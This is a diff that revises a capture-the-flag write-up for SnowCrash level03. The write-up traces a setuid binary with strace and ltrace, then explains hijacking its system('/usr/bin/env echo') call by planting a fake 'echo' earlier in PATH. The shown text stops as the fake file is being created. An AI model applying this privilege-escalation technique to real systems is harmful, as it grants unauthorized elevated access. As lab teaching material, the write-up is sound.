@@ -40,13 +40,15 @@ level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
 ```
 
 Since it can be executed, let us execute it!
-```
+
+```sh
 level03@SnowCrash:~$ ./level03
 Exploit me
 ```
 
 ### `strace`
-Let us run system call tracer `strace` on it.
+
+Let us run the system call tracer `strace` on it.
 
 ```sh
 level03@SnowCrash:~$ strace ./level03
@@ -64,12 +66,11 @@ rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
 exit_group(0)                           = ?
 ```
 
-Nothing.
-
+Nothing useful: no suspicious syscall stands out.
 
 ### `ltrace`
 
-Let us run the librairy call tracer 'ltrace' now.
+Let us run the library call tracer `ltrace` instead, to see which functions are called.
 
 ```sh
 level03@SnowCrash:~$ ltrace ./level03 
@@ -85,10 +86,9 @@ system("/usr/bin/env echo Exploit me"Exploit me
 +++ exited (status 0) +++
 ```
 
-Interesting! At some point, the program wants to execute the `echo` command in order to print "Exploit me"!
-What if we replaced the `echo` command?
+Interesting! At some point, the program calls `system()` to run `/usr/bin/env echo Exploit me`. Since `env` resolves `echo` by searching the `PATH`, and the binary is setuid root, we can hijack that lookup: if we put our own executable named `echo` earlier in the `PATH`, it will run with root privileges instead of the real `echo`.
 
-Let us do so.
+Let us create our own `echo`.
 
 ```sh
 level03@SnowCrash:~$ cat > /tmp/echo
